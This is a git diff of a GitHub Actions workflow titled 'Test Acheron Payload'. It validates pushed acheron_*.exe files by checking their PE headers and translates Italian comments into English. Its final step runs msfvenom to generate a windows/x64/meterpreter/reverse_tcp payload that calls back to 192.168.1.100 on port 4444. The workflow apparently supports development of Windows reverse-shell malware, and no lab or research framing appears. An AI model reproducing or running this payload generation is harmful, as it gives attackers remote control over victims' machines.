@@ -1,10 +1,10 @@
 name: Test Acheron Payload
 
 on:
-  workflow_dispatch:  # Manual trigger from GitHub UI
+  workflow_dispatch:
   push:
     paths:
-      - 'acheron_*.exe'  # Trigger when EXE is pushed
+      - 'acheron_*.exe'
 
 jobs:
   test-payload:
@@ -17,20 +17,20 @@ jobs:
       
       - name: List files
         run: dir
+        shell: pwsh
       
-      - name: Test payload (static analysis)
+      - name: Verify payload exists
         run: |
           $files = Get-ChildItem acheron_*.exe
           if ($files.Count -eq 0) {
-            Write-Error "Nessun EXE trovato!"
+            Write-Error "No EXE found!"
             exit 1
           }
           foreach ($file in $files) {
             Write-Host "Testing: $($file.Name)"
-            # Dry run - verifica che l'EXE sia valido PE
             $sig = (Get-Item $file.FullName).Length
             Write-Host "Size: $sig bytes"
-            # Verifica PE header
+            # Verify PE header
             $bytes = [System.IO.File]::ReadAllBytes($file.FullName)
             if ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
               Write-Host "✅ Valid PE header (MZ)"
@@ -39,10 +39,11 @@ jobs:
               exit 1
             }
           }
+        shell: pwsh
       
       - name: Test msfvenom payload generation
         run: |
-          # Verifica che msfvenom possa generare lo stesso payload
+          # Verify msfvenom can generate the same payload type
           msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f hex EXITFUNC=thread 2>&1 | Select-String "Payload size" | Write-Host
           Write-Host "✅ msfvenom payload generation OK"
         shell: pwsh
